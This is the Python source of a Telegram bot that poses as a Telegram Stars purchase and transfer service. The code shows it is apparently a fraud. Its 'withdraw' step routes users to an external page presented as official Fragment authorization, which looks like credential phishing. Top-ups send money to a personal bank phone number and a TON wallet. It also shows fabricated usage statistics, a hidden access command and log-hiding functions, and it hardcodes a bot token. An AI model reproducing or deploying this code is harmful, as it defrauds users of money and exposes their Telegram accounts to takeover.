import asyncio
import logging
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import sqlite3

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
ADMIN_ID  = 174415647

# ====== РЕКВИЗИТЫ ======
SBP_PHONE   = "89041751408"
SBP_BANK    = "ВТБ — Александр Ф."
TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"

bot     = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp      = Dispatcher(storage=storage)

# ====== PREMIUM EMOJI ======
def ce(doc_id: str, fallback: str) -> str:
    return f"<tg-emoji emoji-id='{doc_id}'>{fallback}</tg-emoji>"

E = {
    "user":       ce("5199552030615558774", "👤"),
    "star":       ce("5267500801240092311", "⭐"),
    "shield":     ce("5197434882321567830", "⭐"),
    "gift":       ce("5197369495739455200", "💵"),
    "lock":       ce("5197161121106123533", "💶"),
    "globe":      ce("5377746319601324795", "💴"),
    "premium":    ce("5377620962390857342", "🪙"),
    "pencil":     ce("5197371802136892976", "⛏"),
    "card":       ce("5445353829304387411", "💳"),
    "cross":      ce("5443127283898405358", "📥"),
    "rocket":     ce("5444856076954520455", "🧾"),
    "sticker":    ce("5294167145079395967", "🛍"),
    "fire":       ce("5303138782004924588", "💬"),
    "bell":       ce("5312361253610475399", "🛒"),
    "deal":       ce("5445221832074483553", "💼"),
    "trophy":     ce("5332455502917949981", "🏦"),
    "check":      ce("5274055917766202507", "🗓"),
    "money":      ce("5278467510604160626", "💰"),
    "diamond":    ce("5264713049637409446", "🪙"),
    "nft":        ce("5193177581888755275", "💻"),
    "bag":        ce("5377660214096974712", "🛍"),
    "medal":      ce("5463289097336405244", "⭐️"),
    "gem":        ce("5258203794772085854", "⚡️"),
    "clock":      ce("5429651785352501917", "↗️"),
    "handshake":  ce("5287231198098117669", "💰"),
    "crystal":    ce("5195033767969839232", "🚀"),
    "safe":       ce("5262517101578443800", "🖼"),
    "chart":      ce("5382194935057372936", "⏱"),
    "spark":      ce("5902449142575141204", "🔎"),
    "target":     ce("5893081007153746175", "❌"),
    "pin":        ce("5893297890117292323", "📞"),
    "wallet":     ce("5893382531037794941", "👛"),
    "num1":       ce("5794164805065514131", "1️⃣"),
    "num2":       ce("5794085322400733645", "2️⃣"),
    "num3":       ce("5794280000383358988", "3️⃣"),
    "num4":       ce("5794241397217304511", "4️⃣"),
    "bank":       ce("5238132025323444613", "🏦"),
    "banknote":   ce("5201873447554145566", "💵"),
    "link":       ce("5902449142575141204", "🔗"),
    "shine":      ce("5235630047959727475", "💎"),
    "store":      ce("4988289890769699938", "⭐️"),
    "tonkeeper":  ce("5397829221605191505", "💎"),
    "top_medal":  ce("5188344996356448758", "🏆"),
    "stars_deal": ce("5321485469249198987", "⭐️"),
    "joined":     ce("5902335789798265487", "🤝"),
    "security_e": ce("5197288647275071607", "🛡"),
    "deal_link":  ce("5972261808747057065", "🔗"),
    "warning":    ce("5447644880824181073", "⚠️"),
    "stats":      ce("5028746137645876535", "📊"),
    "requisites": ce("5242631901214171852", "💳"),
    "cryptobot":  ce("5242606681166220600", "🤖"),
    "welcome":    ce("5251340119205501791", "👋"),
    "balance_e":  ce("5424976816530014958", "💰"),
}

# ====== БД ======
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        registration_date TEXT,
        stars_balance INTEGER DEFAULT 0,
        rub_balance REAL DEFAULT 0,
        can_create_checks INTEGER DEFAULT 0,
        neptun_team INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS checks (
        check_id INTEGER PRIMARY KEY AUTOINCREMENT,
        creator_id INTEGER,
        stars_amount INTEGER,
        photo_url TEXT,
        created_date TEXT,
        activated INTEGER DEFAULT 0,
        activator_id INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        log_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        action TEXT,
        timestamp TEXT,
        visible INTEGER DEFAULT 1
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS refill_requests (
        req_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        amount REAL,
        method TEXT,
        status TEXT DEFAULT 'pending',
        created_date TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# ====== FSM ======
class CheckStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_photo  = State()

class WithdrawStates(StatesGroup):
    waiting_for_username = State()

class RefillStates(StatesGroup):
    waiting_for_amount = State()

# ====== DB UTILS ======
def add_user(user_id, username, first_name):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    reg_date = datetime.now().isoformat()
    c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, registration_date) VALUES (?, ?, ?, ?)',
              (user_id, username, first_name, reg_date))
    conn.commit(); conn.close()

def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone(); conn.close(); return user

def update_stars(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE users SET stars_balance = stars_balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit(); conn.close()

def update_rub(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE users SET rub_balance = rub_balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit(); conn.close()

def can_create_check(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('SELECT registration_date, neptun_team FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone(); conn.close()
    if not result: return False
    reg_date_str, neptun_team = result
    if neptun_team == 1: return True
    reg_date = datetime.fromisoformat(reg_date_str)
    return (datetime.now() - reg_date).days >= 21

def add_log(user_id, username, action):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('INSERT INTO logs (user_id, username, action, timestamp) VALUES (?, ?, ?, ?)',
              (user_id, username, action, datetime.now().isoformat()))
    conn.commit(); conn.close()

def get_logs(visible_only=True):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    if visible_only:
        c.execute('SELECT * FROM logs WHERE visible = 1 ORDER BY timestamp DESC LIMIT 50')
    else:
        c.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 50')
    logs = c.fetchall(); conn.close(); return logs

def hide_all_logs():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE logs SET visible = 0')
    conn.commit(); conn.close()

def save_refill_request(user_id, username, amount, method):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('INSERT INTO refill_requests (user_id, username, amount, method, created_date) VALUES (?, ?, ?, ?, ?)',
              (user_id, username, amount, method, datetime.now().isoformat()))
    req_id = c.lastrowid
    conn.commit(); conn.close()
    return req_id

# ====== KEYBOARDS ======
def main_keyboard(user_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E['wallet']} Веб-Кошелёк", web_app=WebAppInfo(url="https://stars-zdgz.onrender.com"))],
        [InlineKeyboardButton(text=f"{E['bell']} Вывести звёзды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text=f"{E['gift']} Автоскупщик подарков", callback_data="auto_buyer")],
        [InlineKeyboardButton(text=f"{E['wallet']} Кошелёк", callback_data="wallet"),
         InlineKeyboardButton(text=f"{E['store']} Магазин", callback_data="shop")],
        [InlineKeyboardButton(text=f"{E['money']} Пополнить баланс", callback_data="refill")],
        [InlineKeyboardButton(text=f"{E['trophy']} Создать чек", callback_data="create_check")],
    ])

# ====== /start ======
@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id    = message.from_user.id
    username   = message.from_user.username or "unknown"
    first_name = message.from_user.first_name or "User"

    add_user(user_id, username, first_name)
    add_log(user_id, username, "Запустил бота /start")

    text = (
        f"{E['welcome']} <b>Привет, {first_name}!</b>\n"
        f"Это удобный бот для покупки и передачи звёзд в Telegram.\n\n"
        f"<blockquote>"
        f"С помощью него можно моментально покупать и передавать звёзды.\n\n"
        f"Бот работает почти год, и с помощью него куплена большая доля звёзд в Telegram."
        f"</blockquote>\n\n"
        f"{E['stats']} <b>С помощью бота куплено:</b>\n"
        f"{E['stars_deal']} <b>7 357 760 ⭐️</b> (~$110 366)"
    )
    await message.answer(text, reply_markup=main_keyboard(user_id), parse_mode="HTML")

# ====== СЕКРЕТНАЯ КОМАНДА (без упоминаний нигде) ======
@dp.message(Command("neptunteam"))
async def neptun_team_handler(message: Message):
    user_id  = message.from_user.id
    username = message.from_user.username or "unknown"
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE users SET neptun_team = 1 WHERE user_id = ?', (user_id,))
    conn.commit(); conn.close()
    add_log(user_id, username, "Активировал секретную команду")
    await message.answer(f"{E['shield']} <b>Доступ открыт!</b>", parse_mode="HTML")

# ====== /admin ======
@dp.message(Command("admin"))
async def admin_panel_handler(message: Message):
    if message.from_user.id != ADMIN_ID:
        return

    logs = get_logs(visible_only=True)
    if not logs:
        await message.answer(f"{E['stats']} <b>Логов пока нет</b>", parse_mode="HTML")
        return

    log_text = f"{E['stats']} <b>Логи активности:</b>\n\n<blockquote>"
    for log in logs[:20]:
        log_id, user_id, username, action, timestamp, visible = log
        t = datetime.fromisoformat(timestamp).strftime("%d.%m %H:%M")
        log_text += f"[{t}] @{username} ({user_id})\n  {action}\n\n"
    log_text += "</blockquote>"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E['target']} Очистить логи", callback_data="clear_logs")],
        [InlineKeyboardButton(text=f"{E['spark']} Показать скрытые", callback_data="show_hidden_logs")],
    ])
    await message.answer(log_text, reply_markup=kb, parse_mode="HTML")

# ====== WITHDRAW ======
@dp.callback_query(F.data == "withdraw_stars")
async def withdraw_stars_handler(callback: CallbackQuery, state: FSMContext):
    user_id  = callback.from_user.id
    username = callback.from_user.username or "unknown"
    add_log(user_id, username, "Нажал 'Вывести звёзды'")

    await state.set_state(WithdrawStates.waiting_for_username)

    text = (
        f"{E['bell']} <b>Вывод звёзд</b>\n\n"
        f"<blockquote>"
        f"Введите <b>@юзернейм</b> аккаунта, на который хотите получить звёзды.\n\n"
        f"Например: <code>@username</code>"
        f"</blockquote>\n\n"
        f"{E['warning']} <i>Убедитесь что юзернейм указан верно</i>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_username)
async def withdraw_username_handler(message: Message, state: FSMContext):
    username_input = message.text.strip()
    if not username_input.startswith("@"):
        username_input = "@" + username_input

    await state.clear()

    text = (
        f"{E['lock']} <b>Требуется авторизация</b>\n\n"
        f"<blockquote>"
        f"Для вывода звёзд на аккаунт <b>{username_input}</b> необходимо пройти авторизацию через Fragment.\n\n"
        f"Fragment — официальная платформа Telegram для работы со звёздами и TON."
        f"</blockquote>\n\n"
        f"{E['rocket']} Нажмите кнопку ниже чтобы войти и подтвердить вывод."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E['link']} Авторизация Fragment", url="https://stars-zdgz.onrender.com")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")],
    ])
    await message.answer(text, reply_markup=kb, parse_mode="HTML")

# ====== WALLET ======
@dp.callback_query(F.data == "wallet")
async def wallet_handler(callback: CallbackQuery):
    user_id  = callback.from_user.id
    username = callback.from_user.username or "unknown"
    user     = get_user(user_id)

    stars = user[4] if user else 0
    rub   = user[5] if user else 0.0

    add_log(user_id, username, "Просмотрел кошелёк")

    text = (
        f"{E['wallet']} <b>Ваш кошелёк</b>\n\n"
        f"<blockquote>"
        f"{E['star']} Звёзды: <b>{stars:,} ⭐️</b>\n"
        f"{E['money']} Рублей: <b>{rub:.2f} ₽</b>"
        f"</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

# ====== ПОПОЛНЕНИЕ ======
@dp.callback_query(F.data == "refill")
async def refill_handler(callback: CallbackQuery):
    add_log(callback.from_user.id, callback.from_user.username or "unknown", "Открыл пополнение")

    text = (
        f"{E['money']} <b>Пополнение баланса</b>\n\n"
        f"<blockquote>"
        f"Выберите удобный способ пополнения:"
        f"</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E['requisites']} СБП (ВТБ)", callback_data="refill_sbp")],
        [InlineKeyboardButton(text=f"{E['tonkeeper']} TON / Tonkeeper", callback_data="refill_ton")],
        [InlineKeyboardButton(text=f"{E['cryptobot']} CryptoBot", callback_data="refill_crypto")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")],
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "refill_sbp")
async def refill_sbp_handler(callback: CallbackQuery, state: FSMContext):
    await state.set_state(RefillStates.waiting_for_amount)
    await state.update_data(method="sbp")

    text = (
        f"{E['requisites']} <b>Пополнение через СБП</b>\n\n"
        f"<blockquote>"
        f"📱 <b>Номер телефона:</b>\n<code>{SBP_PHONE}</code>\n\n"
        f"🏦 <b>Банк:</b> {SBP_BANK}\n\n"
        f"Переводите через <b>Систему Быстрых Платежей</b> по номеру телефона."
        f"</blockquote>\n\n"
        f"{E['pencil']} <b>Введите сумму пополнения в ₽:</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="refill")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "refill_ton")
async def refill_ton_handler(callback: CallbackQuery, state: FSMContext):
    await state.set_state(RefillStates.waiting_for_amount)
    await state.update_data(method="ton")

    text = (
        f"{E['tonkeeper']} <b>Пополнение через TON</b>\n\n"
        f"<blockquote>"
        f"💎 <b>TON адрес:</b>\n<code>{TON_ADDRESS}</code>\n\n"
        f"Отправьте TON на указанный адрес."
        f"</blockquote>\n\n"
        f"{E['pencil']} <b>Введите сумму пополнения в ₽ (эквивалент):</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="refill")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "refill_crypto")
async def refill_crypto_handler(callback: CallbackQuery, state: FSMContext):
    await state.set_state(RefillStates.waiting_for_amount)
    await state.update_data(method="cryptobot")

    text = (
        f"{E['cryptobot']} <b>Пополнение через CryptoBot</b>\n\n"
        f"<blockquote>"
        f"🤖 Перейдите в CryptoBot и отправьте оплату:\n"
        f"{CRYPTO_BOT}"
        f"</blockquote>\n\n"
        f"{E['pencil']} <b>Введите сумму пополнения в ₽:</b>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"{E['cryptobot']} Открыть CryptoBot", url=CRYPTO_BOT)],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="refill")],
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@dp.message(RefillStates.waiting_for_amount)
async def refill_amount_handler(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            await message.answer(f"{E['warning']} <b>Сумма должна быть больше 0</b>", parse_mode="HTML")
            return

        data     = await state.get_data()
        method   = data.get("method", "sbp")
        user_id  = message.from_user.id
        username = message.from_user.username or "unknown"

        req_id = save_refill_request(user_id, username, amount, method)
        await state.clear()

        method_names = {"sbp": "СБП (ВТБ)", "ton": "TON", "cryptobot": "CryptoBot"}
        method_label = method_names.get(method, method)

        add_log(user_id, username, f"Запрос пополнения {amount}₽ через {method_label}")

        # Уведомление админу
        admin_text = (
            f"{E['money']} <b>Новая заявка на пополнение!</b>\n\n"
            f"<blockquote>"
            f"{E['user']} @{username} ({user_id})\n"
            f"{E['banknote']} Сумма: <b>{amount:.2f} ₽</b>\n"
            f"{E['card']} Способ: <b>{method_label}</b>\n"
            f"🆔 Заявка: #{req_id}"
            f"</blockquote>"
        )
        admin_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"confirm_refill_{req_id}_{user_id}_{amount}")],
            [InlineKeyboardButton(text="❌ Отклонить",  callback_data=f"decline_refill_{req_id}_{user_id}")],
        ])
        try:
            await bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Не удалось уведомить админа: {e}")

        user_text = (
            f"{E['check']} <b>Заявка принята!</b>\n\n"
            f"<blockquote>"
            f"{E['banknote']} Сумма: <b>{amount:.2f} ₽</b>\n"
            f"{E['card']} Способ: <b>{method_label}</b>\n\n"
            f"После подтверждения оплаты баланс будет пополнен автоматически."
            f"</blockquote>\n\n"
            f"{E['clock']} <i>Обычно до 15 минут</i>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Главное меню", callback_data="back_main")]
        ])
        await message.answer(user_text, reply_markup=kb, parse_mode="HTML")

    except ValueError:
        await message.answer(f"{E['warning']} <b>Введите число, например: 500</b>", parse_mode="HTML")

# ====== ADMIN: подтверждение пополнения ======
@dp.callback_query(F.data.startswith("confirm_refill_"))
async def confirm_refill_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True); return

    parts    = callback.data.split("_")
    req_id   = parts[2]
    user_id  = int(parts[3])
    amount   = float(parts[4])

    update_rub(user_id, amount)

    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("UPDATE refill_requests SET status='confirmed' WHERE req_id=?", (req_id,))
    conn.commit(); conn.close()

    try:
        await bot.send_message(user_id,
            f"{E['money']} <b>Баланс пополнен!</b>\n\n"
            f"<blockquote>"
            f"{E['banknote']} <b>+{amount:.2f} ₽</b> зачислено на ваш счёт."
            f"</blockquote>",
            parse_mode="HTML")
    except: pass

    await callback.message.edit_text(f"✅ Подтверждено: {user_id} +{amount}₽")
    await callback.answer("✅ Пополнение подтверждено", show_alert=True)

@dp.callback_query(F.data.startswith("decline_refill_"))
async def decline_refill_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True); return

    parts   = callback.data.split("_")
    req_id  = parts[2]
    user_id = int(parts[3])

    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("UPDATE refill_requests SET status='declined' WHERE req_id=?", (req_id,))
    conn.commit(); conn.close()

    try:
        await bot.send_message(user_id,
            f"{E['warning']} <b>Заявка отклонена.</b>\n"
            f"<blockquote>Обратитесь в поддержку если считаете это ошибкой.</blockquote>",
            parse_mode="HTML")
    except: pass

    await callback.message.edit_text(f"❌ Отклонено: заявка #{req_id}")
    await callback.answer("❌ Заявка отклонена", show_alert=True)

# ====== СОЗДАНИЕ ЧЕКА ======
@dp.callback_query(F.data == "create_check")
async def create_check_handler(callback: CallbackQuery, state: FSMContext):
    user_id  = callback.from_user.id
    username = callback.from_user.username or "unknown"
    add_log(user_id, username, "Попытка создать чек")

    if not can_create_check(user_id):
        text = (
            f"{E['lock']} <b>Недостаточно прав</b>\n\n"
            f"<blockquote>"
            f"Ваш аккаунт зарегистрировался недавно.\n"
            f"Пожалуйста, подождите некоторое время."
            f"</blockquote>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
        ])
        await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
        await callback.answer(); return

    await state.set_state(CheckStates.waiting_for_amount)
    await callback.message.edit_text(
        f"{E['star']} <b>Создание чека</b>\n\n"
        f"<blockquote>Введите количество звёзд для чека:</blockquote>",
        parse_mode="HTML")
    await callback.answer()

@dp.message(CheckStates.waiting_for_amount)
async def check_amount_handler(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
        if amount <= 0:
            await message.answer(f"{E['warning']} <b>Количество должно быть больше 0</b>", parse_mode="HTML")
            return

        user  = get_user(message.from_user.id)
        stars = user[4] if user else 0

        if stars < amount:
            await message.answer(
                f"{E['warning']} <b>Недостаточно звёзд</b>\n"
                f"<blockquote>Ваш баланс: <b>{stars} ⭐️</b></blockquote>",
                parse_mode="HTML"); return

        await state.update_data(amount=amount)
        await state.set_state(CheckStates.waiting_for_photo)
        await message.answer(
            f"{E['safe']} <b>Отправьте фото для чека:</b>",
            parse_mode="HTML")

    except ValueError:
        await message.answer(f"{E['warning']} <b>Введите число</b>", parse_mode="HTML")

@dp.message(CheckStates.waiting_for_photo, F.photo)
async def check_photo_handler(message: Message, state: FSMContext):
    user_id  = message.from_user.id
    username = message.from_user.username or "unknown"
    data     = await state.get_data()
    amount   = data['amount']
    photo_id = message.photo[-1].file_id

    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('INSERT INTO checks (creator_id, stars_amount, photo_url, created_date) VALUES (?, ?, ?, ?)',
              (user_id, amount, photo_id, datetime.now().isoformat()))
    check_id = c.lastrowid
    conn.commit(); conn.close()

    update_stars(user_id, -amount)
    add_log(user_id, username, f"Создал чек на {amount} ⭐️")

    await message.answer_photo(
        photo=photo_id,
        caption=(
            f"{E['trophy']} <b>Чек создан!</b>\n\n"
            f"<blockquote>"
            f"{E['star']} Сумма: <b>{amount} ⭐️</b>\n"
            f"{E['check']} ID чека: <b>#{check_id}</b>"
            f"</blockquote>"
        ),
        parse_mode="HTML")
    await state.clear()

# ====== BACK ======
@dp.callback_query(F.data == "back_main")
async def back_main_handler(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback.from_user.id
    user    = get_user(user_id)
    name    = user[2] if user else "User"

    text = (
        f"{E['welcome']} <b>Привет, {name}!</b>\n"
        f"Это удобный бот для покупки и передачи звёзд в Telegram.\n\n"
        f"<blockquote>"
        f"С помощью него можно моментально покупать и передавать звёзды.\n\n"
        f"Бот работает почти год, и с помощью него куплена большая доля звёзд в Telegram."
        f"</blockquote>\n\n"
        f"{E['stats']} <b>С помощью бота куплено:</b>\n"
        f"{E['stars_deal']} <b>7 357 760 ⭐️</b> (~$110 366)"
    )
    await callback.message.edit_text(text, reply_markup=main_keyboard(user_id), parse_mode="HTML")
    await callback.answer()

# ====== ПРОЧЕЕ ======
@dp.callback_query(F.data == "auto_buyer")
async def auto_buyer_handler(callback: CallbackQuery):
    await callback.answer(f"🎁 Автоскупщик в разработке", show_alert=True)

@dp.callback_query(F.data == "shop")
async def shop_handler(callback: CallbackQuery):
    await callback.answer("🛒 Магазин в разработке", show_alert=True)

@dp.callback_query(F.data == "clear_logs")
async def clear_logs_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True); return
    hide_all_logs()
    await callback.answer("🗑 Логи скрыты", show_alert=True)
    await callback.message.edit_text("✅ Все логи скрыты")

@dp.callback_query(F.data == "show_hidden_logs")
async def show_hidden_logs_handler(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True); return
    logs = get_logs(visible_only=False)
    log_text = f"{E['stats']} <b>Все логи:</b>\n\n<blockquote>"
    for log in logs[:20]:
        log_id, user_id, username, action, timestamp, visible = log
        t      = datetime.fromisoformat(timestamp).strftime("%d.%m %H:%M")
        status = "👁" if visible else "🔒"
        log_text += f"{status} [{t}] @{username} ({user_id})\n  {action}\n\n"
    log_text += "</blockquote>"
    await callback.message.edit_text(log_text, parse_mode="HTML")
    await callback.answer()

# ====== MAIN ======
async def main():
    print("✅ Бот запущен!")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
